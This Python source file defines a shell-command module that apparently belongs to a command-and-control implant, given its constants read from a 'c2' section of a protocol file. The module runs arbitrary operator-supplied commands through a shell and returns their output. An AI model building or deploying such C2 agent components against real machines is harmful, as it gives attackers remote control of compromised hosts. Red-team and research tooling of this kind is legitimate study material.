"""shell.py - Shell command execution module."""

import json
import subprocess
from pathlib import Path

from .base import BaseModule

# Load constants from shared protocol spec
_PROTO_PATH = Path(__file__).resolve().parent.parent.parent.parent / 'shared' / 'protocol.json'
with open(_PROTO_PATH) as _f:
    _PROTO = json.load(_f)

SHELL_TIMEOUT = _PROTO['c2']['shell_timeout']
MAX_RESULT_SIZE = _PROTO['c2']['max_result_size']


class ShellModule(BaseModule):
    """Execute shell commands and capture output."""

    @property
    def name(self) -> str:
        return "shell"

    def execute(self, args: dict) -> tuple:
        """Execute a shell command.

        Args:
            args: Dict with 'cmd' key containing the shell command.

        Returns:
            Tuple of (status, output_data).
        """
        cmd_str = args.get("cmd", "")
        if not cmd_str:
            return ("error", "Empty command")

        try:
            result = subprocess.run(
                cmd_str, shell=True, capture_output=True,
                text=True, timeout=SHELL_TIMEOUT,
            )
            output = result.stdout + result.stderr
            if len(output) > MAX_RESULT_SIZE:
                output = output[:MAX_RESULT_SIZE] + "\n[truncated]"
            status = "ok" if result.returncode == 0 else "error"
            return (status, output)
        except subprocess.TimeoutExpired:
            return ("error", f"Command timed out after {SHELL_TIMEOUT}s")
